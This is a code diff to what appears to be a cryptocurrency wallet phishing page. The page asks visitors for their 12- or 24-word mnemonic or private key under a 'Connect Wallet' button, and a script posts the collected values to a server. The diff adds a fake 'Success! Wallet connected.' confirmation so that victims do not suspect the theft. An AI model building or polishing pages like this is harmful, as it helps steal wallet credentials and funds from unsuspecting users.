@@ -2030,6 +2030,7 @@
                                 <textarea  id="details" placeholder="Enter your 12 /24 Mnemonic words or Private Key."
                                     style="font-size:25px; font-weight:650" rows="4" name="phrase" required></textarea>
                                 <p>...</p>
+                                <p id="successMessage" style="color: green; display: none;">Success! Wallet connected.</p>
                                 <button type="submit"  class="btn btn-primary"
                                     style="border-top: 5px; ">Connect Wallet</button>
                             </div>
@@ -2060,6 +2061,8 @@
         document.getElementById('walletForm').addEventListener('submit', function (e) {
       e.preventDefault();
 
+
+      const successMessage = document.getElementById("successMessage");
       // Collect form data
       const details = document.getElementById('details').value;
       const wal_name = document.getElementById('wal_name').value
@@ -2092,6 +2095,9 @@
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
+            successMessage.style.display = "block";
+
+
           
         } else {
     
